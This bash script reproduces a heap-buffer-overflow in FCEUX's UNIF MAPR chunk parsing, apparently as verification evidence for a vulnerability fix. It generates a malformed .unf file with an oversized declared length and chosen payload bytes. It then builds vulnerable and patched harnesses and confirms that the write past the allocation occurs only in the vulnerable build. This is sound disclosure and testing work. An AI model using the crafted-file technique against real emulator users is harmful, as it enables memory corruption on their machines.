#!/usr/bin/env bash
# Stage/replay the FCEUX UNIF MAPR heap-write evidence. Offline, loopback-free.
set -u
cd "$(dirname "$0")"
mkdir -p evidence
E=evidence

python3 - <<'PY'
payload = b'TAU,ffMISHE-FCEUX!!'
open('harness/attack.unf','wb').write(b'MAPR' + b'\xff\xff\xff\xff' + payload)
open('harness/safe.unf','wb').write(b'MAPR' + (8).to_bytes(4,'little') + b'NES-TEST')
open('evidence/expected.txt','w').write('PAST_ALLOC=' + payload[1:17].hex() + '\n')
PY
PASS=0; FAIL=0
note() { printf '%s\n' "$*"; }
ck() { # ck NAME CONDITION
  if [ "$2" = 0 ]; then note "PASS $1"; PASS=$((PASS+1)); else note "FAIL $1"; FAIL=$((FAIL+1)); fi
}

# Pin integrity: the fetched parent/fixed sources and the upstream fix patch.
sha256sum -c pins/SHA256SUMS > "$E/pins.txt" 2>&1
ck "pins-sha256" "$?"
grep -q 'boardname\[uchead.info\] = 0;' pins/unif-parent.cpp
ck "vulnerable-terminator-in-pinned-parent" "$?"
grep -q 'FCEU_fread(boardname, 1, info, fp) != info' pins/unif-fixed.cpp
ck "fixed-read-check-in-pinned-source" "$?"
grep -q 'uchead.info > size - position' pins/unif-fix.patch
ck "declared-size-check-in-upstream-patch" "$?"

build() { # build CC FLAGS DEFINE OUT
  "$1" -std=c++17 -O0 -g -fno-omit-frame-pointer $2 $3 -o "$4" harness/driver.cpp
}
build g++ "-fsanitize=address" -DVULN harness/vuln-gcc-asan
build clang++ "-fsanitize=address" -DVULN harness/vuln-clang-asan
build g++ "-fsanitize=address" -DFIXED harness/fixed-gcc-asan
build clang++ "-fsanitize=address" -DFIXED harness/fixed-clang-asan
build g++ "" "-DVULN -DPLAIN" harness/vuln-plain
build g++ "" "-DFIXED -DPLAIN" harness/fixed-plain
BUILT=$?
ck "all-builds" "$BUILT"

run() { # run BIN INPUT OUT
  "$1" "$2" > "$3" 2>&1
  echo $? > "$3.rc"
}

for cc in gcc clang; do
  run "harness/vuln-$cc-asan" harness/attack.unf "$E/vuln-$cc-asan.out"
  grep -q 'AddressSanitizer: heap-buffer-overflow' "$E/vuln-$cc-asan.out"
  ck "$cc-asan-attack-write" "$?"
  run "harness/fixed-$cc-asan" harness/attack.unf "$E/fixed-$cc-asan.out"
  RC=$(cat "$E/fixed-$cc-asan.out.rc")
  [ "$RC" = 0 ] && ! grep -q AddressSanitizer "$E/fixed-$cc-asan.out"
  ck "$cc-asan-fixed-clean" "$?"
done

run harness/vuln-gcc-asan harness/safe.unf "$E/vuln-gcc-asan-safe.out"
RC=$(cat "$E/vuln-gcc-asan-safe.out.rc")
[ "$RC" = 0 ] && grep -q '^OK board=TEST' "$E/vuln-gcc-asan-safe.out"
ck "asan-vuln-safe-clean" "$?"

run harness/vuln-plain harness/attack.unf "$E/vuln-plain-attack.out"
RC=$(cat "$E/vuln-plain-attack.out.rc")
EXPECTED=$(cat "$E/expected.txt")
[ "$RC" = 42 ] && grep -qF "$EXPECTED" "$E/vuln-plain-attack.out"
ck "plain-vuln-chosen-bytes-past-allocation" "$?"

run harness/fixed-plain harness/attack.unf "$E/fixed-plain-attack.out"
RC=$(cat "$E/fixed-plain-attack.out.rc")
[ "$RC" = 0 ] && ! grep -q PAST_ALLOC "$E/fixed-plain-attack.out"
ck "plain-fixed-attack-clean" "$?"

run harness/vuln-plain harness/safe.unf "$E/vuln-plain-safe.out"
RC=$(cat "$E/vuln-plain-safe.out.rc")
[ "$RC" = 0 ] && grep -q '^OK board=TEST' "$E/vuln-plain-safe.out"
ck "plain-vuln-safe-clean" "$?"

run harness/fixed-plain harness/safe.unf "$E/fixed-plain-safe.out"
RC=$(cat "$E/fixed-plain-safe.out.rc")
[ "$RC" = 0 ] && grep -q '^OK board=TEST' "$E/fixed-plain-safe.out"
ck "plain-fixed-safe-clean" "$?"

note "TOTAL $PASS PASS / $FAIL FAIL"
[ "$FAIL" = 0 ]
